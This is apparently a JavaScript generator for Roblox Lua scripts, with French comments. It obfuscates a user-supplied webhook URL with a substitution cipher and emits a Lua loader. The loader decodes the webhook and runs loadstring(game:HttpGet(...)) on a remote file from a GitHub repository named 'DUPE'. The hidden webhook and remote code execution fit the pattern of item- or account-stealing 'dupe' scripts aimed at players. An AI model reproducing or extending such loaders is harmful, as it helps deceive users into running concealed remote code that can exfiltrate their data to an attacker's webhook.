// Table de substitution pour lettres et chiffres uniquement
const SUBSTITUTION = {
  "a":"k","b":"x","c":"m","d":"q","e":"v","f":"z","g":"r","h":"n","i":"y","j":"s",
  "k":"a","l":"b","m":"c","n":"d","o":"e","p":"f","q":"g","r":"h","s":"i","t":"j",
  "u":"l","v":"o","w":"p","x":"t","y":"u","z":"w",
  "A":"K","B":"X","C":"M","D":"Q","E":"V","F":"Z","G":"R","H":"N","I":"Y","J":"S",
  "K":"A","L":"B","M":"C","N":"D","O":"E","P":"F","Q":"G","R":"H","S":"I","T":"J",
  "U":"L","V":"O","W":"P","X":"T","Y":"U","Z":"W",
  "0":"9","1":"8","2":"7","3":"6","4":"5","5":"4","6":"3","7":"2","8":"1","9":"0"
};

// Table inverse
const DECODE = Object.fromEntries(Object.entries(SUBSTITUTION).map(([k,v])=>[v,k]));

// Encode seulement lettres et chiffres, garder symboles intacts
function encodeWebhook(text){
  return text.split('').map(c => SUBSTITUTION[c] || c).join('');
}

// Génère Lua avec décodage
function generateLuaScript(encoded){
  let luaDecodeTable = Object.entries(SUBSTITUTION)
    .map(([k,v]) => `["${v}"]="${k}"`)
    .join(", ");
  return `getgenv().UserWebhookURL = "${encoded}"
local REVERSE_SUB = {${luaDecodeTable}}
local function decode(text)
  local out = {}
  for i=1,#text do
    local c = text:sub(i,i)
    table.insert(out, REVERSE_SUB[c] or c)
  end
  return table.concat(out)
end
local webhook = decode(getgenv().UserWebhookURL)
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/DUPE/refs/heads/main/settings.md"))()`;
}
